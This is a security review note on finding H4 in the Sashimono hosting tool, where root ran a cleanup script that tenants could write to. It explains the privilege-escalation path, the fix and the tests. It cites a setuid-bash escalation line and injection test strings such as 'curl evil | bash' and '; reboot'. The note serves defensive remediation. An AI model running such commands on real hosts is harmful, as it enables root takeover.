# H4: Root Runs a Tenant-Owned Cleanup Script

This note explains finding **H4** from `GADGET_COMMITS_REVIEW.md`: what the code did, who added it, what could go wrong, how it was fixed, and what changes for hosts. **Status: fixed on 2026-10-15.** See the Fix log in `GADGET_COMMITS_REVIEW.md`.

## 1. A few terms first

**Instance user (host user).** Each instance gets its own Linux user on the host, for example `sashi1729...`. The tenant's rootless Docker daemon runs as this user, so "root" inside the container is only this user on the host. A container escape lands here, not as root. This is Sashimono's main isolation boundary.

**Cleanup script.** A per-instance shell script. Commands that must run when the lease ends are added to it while the instance is set up. `user-uninstall.sh` runs it **as root** when the lease ends, after the user's processes are killed and before the user is deleted.

**NPMplus entries.** On NPMplus hosts, the custom-domain feature creates a proxy host and sometimes a certificate in NPMplus for each instance. They must be deleted when the lease ends.

## 2. What the code did

The script lived at `/home/<user>/uninstall_cleanup.sh`, and `user-uninstall.sh` ran it:

```bash
if [ -f $cleanup_script ]; then
    echo "Executing cleanup script..."
    chmod +x $cleanup_script
    /bin/bash -c $cleanup_script
fi
```

These lines went into it:

| Line | Written by | Runs as | Since |
|---|---|---|---|
| `ip addr del <ipv6> dev <iface>` | `user-install.sh` | root | 2023, `c9a4c18` (outbound IPv6), released |
| `curl ... DELETE .../certificates/<id>`, with the NPMplus token | the generated `domain_ssl_update.sh` | **the instance user** | Gadget, `10078bb` |
| `curl ... DELETE .../proxy-hosts/<id>`, with the token | the generated `domain_ssl_update.sh` | **the instance user** | Gadget, `10078bb` |
| `cat ~/.docker/domain_ssl_update.log >> /root/domain_ssl_update.log` | `user-install.sh` | root | Gadget, `10078bb` |

Then `user-install.sh` ran `chown -R $user:$user $cleanup_script`. This was Gadget's change (two copies in `10078bb`, merged into one by the L6 cleanup), and it ran on every host, with or without NPMplus.

## 3. Who created it

- **The cleanup script** came with outbound IPv6 support (`c9a4c18`, 2023). It was already in the user's home folder. The file was owned by root, but the user owns the folder, so they could delete it and create their own. That was a smaller weakness that already existed.
- **Gadget** (`10078bb`, 2025-06-14, PR #434) made the tenant user the owner of the file, and made a script that runs as that user append **command lines** to it, including the NPMplus admin token.

## 4. What could go wrong

- **Root ran whatever the instance user wrote.** Anyone who can run code as the instance user, through a container escape or a bug in a script that runs as that user, adds one line such as `chmod u+s /bin/bash`. When the lease ends, root runs it. That gives full control of the host and every other tenant on it.
- **The design required tenant writes.** It wasn't a forgotten permission: the domain feature needed the tenant side to write commands for root to run.
- **The NPMplus admin token** was written in plain text into a file the tenant can read (part of H1).
- **Root copied a tenant-controlled file** (the log) into `/root`.

**Severity in context:** High rather than Critical, because the attacker first needs to run code as the host user. But it removed the last barrier between that and root.

## 5. The fix

**Rule:** root never runs anything the tenant can write. Commands go into a root-owned place outside the home folder. Anything the tenant side has to record is stored as **data**, which root checks before using.

### `dependencies/user-install.sh`

- The cleanup script is now `/etc/sashimono/cleanup/<user>.sh`. The folder is created with mode 700 next to the `ip addr del` line, which is now the only line in the script. The `chown` is gone.
- The log copy line is gone.
- In the generated `domain_ssl_update.sh`, the four `curl` command lines became data lines in `~/.docker/npm_resources`:

  ```bash
  echo "certificates $NPM_CERT_ID" >>/home/<user>/.docker/npm_resources
  echo "proxy-hosts $NPM_PROXYHOSTS_ID" >>/home/<user>/.docker/npm_resources
  ```

### `dependencies/user-uninstall.sh`

- Runs the root-owned cleanup script as before, then deletes it. The old home file is never run. It is deleted with the home folder.
- Deletes the NPMplus entries itself:

  ```bash
  if [ -f "$npm_resources" ] && [ ! -L "$npm_resources" ]; then
      npm_url=$(jq -r ".proxy.npm_url | select( . != null )" "$MBXRPL_CONFIG" 2>/dev/null)
      npm_token_path=$(jq -r ".proxy.npm_tokenPath | select( . != null )" "$MBXRPL_CONFIG" 2>/dev/null)
      [ -n "$npm_token_path" ] && npm_token=$(jq -r ".npm.token | select( . != null )" "$npm_token_path" 2>/dev/null)
      if [ -n "$npm_url" ] && [ -n "$npm_token" ]; then
          head -c 65536 "$npm_resources" | grep -xE '(proxy-hosts|certificates) [0-9]{1,10}' | sort -ur | head -n 100 | while read -r npm_type npm_id; do
              curl -k -s -m 10 -X DELETE ... "$npm_url/api/nginx/$npm_type/$npm_id"
          done
      fi
  fi
  ```

  - Only a regular file that is not a symlink is read, and only its first 64 KiB. Otherwise a FIFO, a symlink to `/proc/kmsg` (root can read it, and it never ends) or a huge sparse file (it uses no disk, so the quota doesn't stop it) could make uninstall hang or run for hours. The tenant script creates the file with `>>`, so a real one is never a symlink, and it holds only a few dozen bytes per weekly run.
  - Only exact `type number` lines are used, so text in the file can never become a command or a different API path.
  - `sort -u` removes duplicates. The weekly update records the same proxy host again each time it runs.
  - Reverse order deletes proxy hosts before the certificates they use.
  - `head -n 100` and `-m 10` limit how long a flooded file can hold up the uninstall: about 17 minutes at most (100 × 10 s). The agent waits for it, and mb-xrpl handles one lease at a time.
  - The token comes from root's own config, not from the tenant's file.

### Full uninstaller

Nothing changed. It deletes `/etc/sashimono` on a full uninstall and keeps it on upgrade, so existing instances' cleanup scripts survive an upgrade.

## 6. Decisions

- **Do the NPMplus part now.** The domain feature won't be used before its design review, but uninstall should already behave the same way for every instance.
- **Drop the log copy.** It was only for debugging, and it made root copy a file the tenant controls.
- **No migration for old home files.**
  - The `ip addr del` line **is** in the released version (`ES2025.8.1`), so production instances have it in their home file.
  - Running only strictly checked `ip addr del` lines from that file was considered. It was rejected because a compromised old instance could still make root remove any IPv6 address on that interface, including the host's own.
  - Skipping the file costs little: mb-xrpl gives each lease slot a fixed IPv6 address. An address left behind is used again by the next lease on that slot, which removes it at its end. A reboot also clears it.

### Pros and cons

| Pros | Cons |
|---|---|
| Code running as the instance user can no longer become root through uninstall. | On released hosts, instances created before the upgrade leave their IPv6 address on the interface after their lease ends, until the slot is leased again or the host reboots. |
| The NPMplus token is no longer written into the cleanup file. | The tenant still chooses which NPMplus IDs root deletes (see section 8). |
| Root's cleanup script holds only root's own line. | Dev-host instances from Gadget's code keep their NPMplus entries after uninstall. |
| A tenant-written file can delay an uninstall by about 17 minutes at most, and can't make it hang. | |

## 7. What hosts see

| Situation | Before | After |
|---|---|---|
| Where the cleanup script lives | `/home/<user>/uninstall_cleanup.sh`, owned by the tenant | `/etc/sashimono/cleanup/<user>.sh`, root only |
| Tenant adds a command to it | Root runs it at lease end | The tenant can't write it |
| Instance with outbound IPv6 ends (new instance) | Address removed | Address removed |
| Instance with outbound IPv6 ends (created before the upgrade) | Address removed | Address stays until the slot is reused or a reboot |
| NPMplus cleanup | Command lines with the token, written by the tenant side | Numeric IDs, checked and deleted by root with its own token |
| `/root/domain_ssl_update.log` | Grows with every lease | No longer written |

## 8. What the fix does not cover

- **Which IDs are deleted.** The tenant chooses the IDs in `npm_resources`, so root can be made to delete another NPMplus entry. Today this gives nothing new, because the host user already holds the token (H1) and can do that directly. Once H1 is fixed, the C4 fix (record the IDs at creation time in a root-owned file) closes it.
- **Gadget-era instances on dev hosts.** Their generated `domain_ssl_update.sh` still appends `curl` lines to the old home file, which is no longer run, so their NPMplus entries stay.
- **H1 and M13.** The token is still in `domain_ssl_update.sh`, and NPMplus is still called with `curl -k`.
- **Legacy cleanup.** The `rm -f /root/domain_ssl_update.log` line in the full uninstaller (L2) stays, for hosts that already have the file.

## 9. How it was checked

- Rendered `domain_ssl_update.sh`, old vs new: only the 4 recording lines differ. The IDs are filled in when it runs, and it passes `bash -n`.
- With a stubbed `ip`:
  - no cleanup folder without IPv6;
  - with IPv6, a folder with mode 700 holding the one `ip addr del` line;
  - uninstall ran it and deleted the file, and a second uninstall without the file passed.
- With a stubbed `curl`:
  - valid and duplicate lines: one call each, proxy hosts first;
  - injected text (`; reboot`, `curl evil | bash`, `../`, negative, 11-digit, unknown type, leading space): only the exact line was used;
  - 500 lines: 100 calls;
  - missing config or token path: no calls;
  - a symlink to a FIFO, to `/proc/kmsg`, to `/etc/passwd` or to a valid file: skipped, no calls, no hang;
  - a 100 GB sparse file: done in 70 ms, no calls; an entry after the first 64 KiB: ignored;
  - a missing file: no calls.
- `bash -n` passes for both scripts. `shellcheck` 0.10.0: `user-install.sh` 60 → 57, `user-uninstall.sh` 22 → 22.

**Not yet done:** an instance with outbound IPv6 on a real host (create, rollback, lease end), and a custom-domain instance on an NPMplus host.

## 10. Suggested release note

> Instance cleanup commands are now kept in a root-only folder (`/etc/sashimono/cleanup`) instead of the instance user's home folder. Instances created before this release do not remove their outbound IPv6 address when their lease ends; the address is reused by the next lease on that slot or cleared at reboot.
